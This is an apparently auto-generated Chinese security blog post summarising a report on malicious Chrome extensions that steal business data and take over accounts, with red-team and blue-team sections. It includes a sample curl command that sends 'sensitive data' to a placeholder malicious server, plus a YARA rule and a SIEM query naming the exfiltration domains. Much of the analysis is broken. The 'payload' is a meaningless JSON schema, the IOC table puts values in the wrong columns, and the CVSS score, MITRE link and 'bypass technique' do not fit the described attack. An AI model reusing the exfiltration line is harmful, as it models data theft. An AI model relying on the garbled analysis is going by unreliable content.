---
layout: post
title:  "Malicious Chrome Extensions Caught Stealing Business Data, Emails, and Browsing History"
date:   2026-02-13 12:41:55 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Chrome 擴充功能的惡意利用：從資料竊取到帳戶接管
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 資料竊取和帳戶接管
> * **關鍵技術**: `Chrome 擴充功能`, `資料竊取`, `帳戶接管`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意 Chrome 擴充功能可以竊取用戶的資料和帳戶資訊，包括 Facebook 和 Meta Business Suite 的資料。
* **攻擊流程圖解**: 
    1. 用戶安裝惡意 Chrome 擴充功能。
    2. 惡意擴充功能竊取用戶的資料和帳戶資訊。
    3. 惡意擴充功能將竊取的資料傳送到惡意伺服器。
* **受影響元件**: Chrome 擴充功能，包括 `CL Suite` 和 `VK Styles` 等。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要安裝惡意 Chrome 擴充功能。
* **Payload 建構邏輯**:

    ```
    
    python
    # 範例 Payload
    payload = {
        "type": "object",
        "properties": {
            "data": {
                "type": "string"
            }
        }
    }
    
    ```
    * **範例指令**: `curl -X POST -H "Content-Type: application/json" -d '{"data": "敏感資料"}' https://惡意伺服器.com`
* **繞過技術**: 惡意擴充功能可以使用 `VK Styles` 的技術來繞過 Chrome 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `jkphinfhmfkckkcnifhjiplhfoiefffl` | `getauth[.]pro` | `claude.tapnetic[.]pro` | `/usr/lib/chromium-browser/extensions/` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Chrome_Malicious_Extension {
        meta:
            description = "惡意 Chrome 擴充功能"
            author = "Your Name"
        strings:
            $a = "getauth[.]pro"
            $b = "claude.tapnetic[.]pro"
        condition:
            any of them
    }
    
    ```
    * **SIEM 查詢語法**: `search index=chrome_extensions (getauth[.]pro OR claude.tapnetic[.]pro)`
* **緩解措施**: 刪除惡意 Chrome 擴充功能，更新 Chrome 至最新版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Chrome 擴充功能 (Chrome Extension)**: 一種可以增加 Chrome 功能的程式。
* **資料竊取 (Data Exfiltration)**: 惡意程式竊取用戶的敏感資料。
* **帳戶接管 (Account Takeover)**: 惡意程式控制用戶的帳戶。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/malicious-chrome-extensions-caught.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


